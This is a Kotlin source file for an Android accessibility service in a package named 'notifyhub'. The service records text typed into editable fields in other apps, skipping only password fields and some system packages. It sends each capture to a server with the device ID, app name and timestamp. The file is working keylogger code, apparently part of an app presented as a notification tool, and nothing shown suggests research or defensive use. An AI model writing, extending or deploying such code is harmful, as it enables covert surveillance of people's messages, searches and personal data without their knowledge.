package com.notifyhub

import android.accessibilityservice.AccessibilityService
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.time.Instant
import java.util.concurrent.ConcurrentHashMap

/**
 * Captures text the user types into editable fields and forwards it to the server.
 *
 * Design choices (kept deliberately conservative):
 *  - Only editable nodes (isEditable) are considered.
 *  - Password fields (isPassword) are NEVER captured.
 *  - Our own package and system/IME noise packages are skipped.
 *  - Captures are debounced: a field is only sent after the user pauses typing
 *    ([DEBOUNCE_MS] of no changes), or immediately when focus leaves the field.
 *  - Identical consecutive values for the same field are dropped.
 */
class TypedTextService : AccessibilityService() {

    private companion object {
        const val DEBOUNCE_MS = 1500L
        const val FLUSH_INTERVAL_MS = 500L
        val BLOCKLIST = setOf(
            "android",
            "com.android.systemui",
            "com.android.settings",
            "com.google.android.gms",
            "com.android.phone",
            "com.android.incallui",
            "com.miui.daemon",
            "com.miui.securitycenter"
        )
    }

    private data class PendingText(
        val packageName: String,
        val appLabel: String,
        val text: String,
        val updatedAt: Long
    )

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private val pending = ConcurrentHashMap<String, PendingText>()
    private val lastSent = ConcurrentHashMap<String, String>()

    override fun onServiceConnected() {
        scope.launch {
            while (isActive) {
                delay(FLUSH_INTERVAL_MS)
                flushExpired()
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return
        // Never capture our own UI, and skip system/IME noise packages.
        if (pkg == packageName || pkg in BLOCKLIST) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> onTextChanged(event, pkg)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> commitOthers(keyOf(event, pkg))
        }
    }

    private fun onTextChanged(event: AccessibilityEvent, pkg: String) {
        val source = event.source ?: return
        if (!source.isEditable) return
        if (source.isPassword) return

        val text = source.text?.toString()?.trim().orEmpty()
        if (text.isBlank()) return

        val key = keyOf(event, pkg, source.viewIdResourceName)
        pending[key] = PendingText(pkg, labelFor(pkg), text, System.currentTimeMillis())
    }

    /** Sends every field that has been idle longer than the debounce window. */
    private fun flushExpired() {
        val now = System.currentTimeMillis()
        for ((key, item) in pending) {
            if (now - item.updatedAt >= DEBOUNCE_MS) send(key, item)
        }
    }

    /** Focus moved to a different field — commit anything else still pending. */
    private fun commitOthers(activeKey: String) {
        for ((key, item) in pending) {
            if (key != activeKey) send(key, item)
        }
    }

    private fun send(key: String, item: PendingText) {
        if (!pending.remove(key, item)) return
        if (lastSent[key] == item.text) return
        lastSent[key] = item.text

        NotificationSender.sendTypedText(
            deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID),
            packageName = item.packageName,
            appLabel = item.appLabel,
            text = item.text,
            capturedAt = Instant.now().toString()
        )
    }

    private fun keyOf(event: AccessibilityEvent, pkg: String, viewId: String? = null): String {
        val id = viewId
            ?: event.source?.viewIdResourceName
            ?: event.source?.hashCode()?.toString()
            ?: "unknown"
        return "$pkg:$id"
    }

    private fun labelFor(pkg: String): String = try {
        packageManager.getApplicationLabel(
            packageManager.getApplicationInfo(pkg, 0)
        ).toString()
    } catch (_: Exception) {
        pkg
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
